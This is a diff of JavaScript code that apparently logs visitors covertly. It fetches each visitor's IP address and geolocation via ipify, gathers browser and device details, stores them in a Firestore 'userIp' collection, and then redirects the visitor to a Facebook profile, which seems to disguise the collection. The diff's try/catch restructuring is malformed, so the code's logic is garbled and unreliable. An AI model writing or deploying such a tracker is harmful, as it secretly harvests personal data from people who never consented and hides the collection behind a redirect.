@@ -16,7 +16,8 @@ fetch('https://api.ipify.org/?format=json')
             isp: data.isp,
         }
 
-const deviceInfo = {
+        try{
+          const deviceInfo = {
     userAgent: navigator.userAgent,
     language: navigator.language,
     platform: navigator.platform,
@@ -37,13 +38,17 @@ console.log(deviceInfo);
       })
       .catch(error => {
         console.error(error);
-        db.collection("userIp").add({
-            ipAddress, time: new Date(), geoBasicInfo,
+      });
+        }catch{
+          db.collection("userIp").add({
+            ipAddress, time: new Date(), geoBasicInfo, deviceInfo,
 //             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
         }).then(_ => {
             window.location.replace("http://www.facebook.com/profile.php?")
         });
-      });
+        }
+
+
 
 
 
